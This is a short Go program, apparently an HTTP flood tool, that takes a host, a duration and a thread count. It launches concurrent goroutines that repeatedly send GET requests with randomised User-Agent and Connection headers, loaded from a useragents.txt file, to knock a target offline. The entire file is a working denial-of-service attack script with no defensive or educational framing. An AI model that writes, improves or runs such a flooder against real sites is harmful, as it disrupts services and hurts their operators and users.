package main

import (
	"bufio"
	"fmt"
	"os"
	"time"

	//"strings"
	"math/rand"
	"net/http"
	"strconv"
)

var agents []string
var connections = []string{"keep-alive", "close", "accept"}

func init_agents() {
	fp, err := os.Open("useragents.txt")
	if err != nil {
		recover()
		fmt.Printf("%v\n", err)
		return
	}
	scanner := bufio.NewScanner(fp)
	for scanner.Scan() {
		if len(scanner.Text()) > 10 {
			agents = append(agents, scanner.Text())
		}
	}
}
func flood(url string, floodtime int) {
	rand.Seed(time.Now().Unix())
	conn, err := http.NewRequest("GET", url, nil)
	if err != nil || conn == nil {
		fmt.Printf("error: %v\n", err)
		return
	}
	var client = &http.Client{}
	conn.Header.Set("Connection", connections[rand.Intn(len(connections))])
	conn.Header.Set("User-Agent", agents[rand.Intn(len(agents))])
	conn.Header.Set("Accept-Language", "en-us,en;q=0.5")
	conn.Header.Set("Pragma", "no-cache")
	conn.Header.Set("Accept-Encoding", "gzip,deflate")
	start := time.Time(time.Now())
	for {
		elapsed := time.Since(start) / 1000000000
		if int(elapsed) > floodtime {
			break
		}
		client.Do(conn)
	}
}
func main() {
	if len(os.Args) != 4 {
		fmt.Printf("usage: %s [host] [time] [threads]\n", os.Args[0])
		return
	}
	init_agents()
	threads, _ := strconv.Atoi(os.Args[3])
	sec, _ := strconv.Atoi(os.Args[2])
	for i := 0; i < threads; i++ {
		go flood(os.Args[1], sec)
	}
	time.Sleep(time.Duration(sec) * time.Second)
}
